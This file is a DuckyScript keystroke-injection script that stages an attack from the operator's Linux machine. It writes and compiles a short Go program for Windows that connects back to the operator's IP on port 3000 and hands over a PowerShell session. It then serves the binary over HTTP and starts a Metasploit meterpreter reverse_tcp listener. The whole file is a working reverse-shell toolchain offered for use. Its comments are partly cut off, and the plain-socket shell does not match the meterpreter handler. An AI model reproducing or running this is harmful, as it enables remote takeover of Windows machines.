REM runs Windows Server
REM Install rustpacker for 

DEFAULT_DELAY 200

REM Init
DELAY 200
GUI t
DELAY 500
STRINGLN set LOCAL_IP (ip addr show | awk '/inet / {print $2}' | cut -d'/' -f1 | sed -n '2p')
STRINGLN mkdir -p /tmp/ducky/
STRINGLN cd /tmp/ducky/

REM build
STRINGLN git clone https://github.com/CodedMasonry/flipping_duckling.git
STRINGLN cd flipping_duckling/bin_windows_reverse/

STRINGLN echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","$LOCAL_IP:3000");cmd:=exec.Command("powershell");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && GOOS=windows go build /tmp/t.go && rm /tmp/t.go
DELAY 1000
STRINGLN mv /tmp/t.exe /tmp/ducky/windows.exe

REM Start serving
STRINGLN echo $LOCAL_IP
STRINGLN python3 -m http.server 8080

REM Start Listening
GUI t
DELAY 500
STRINGLN set LOCAL_IP (ip addr show | awk '/inet / {print $2}' | cut -d'/' -f1 | sed -n '2p')
STRINGLN msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost $LOCAL_IP; set lport 3000; exploit"
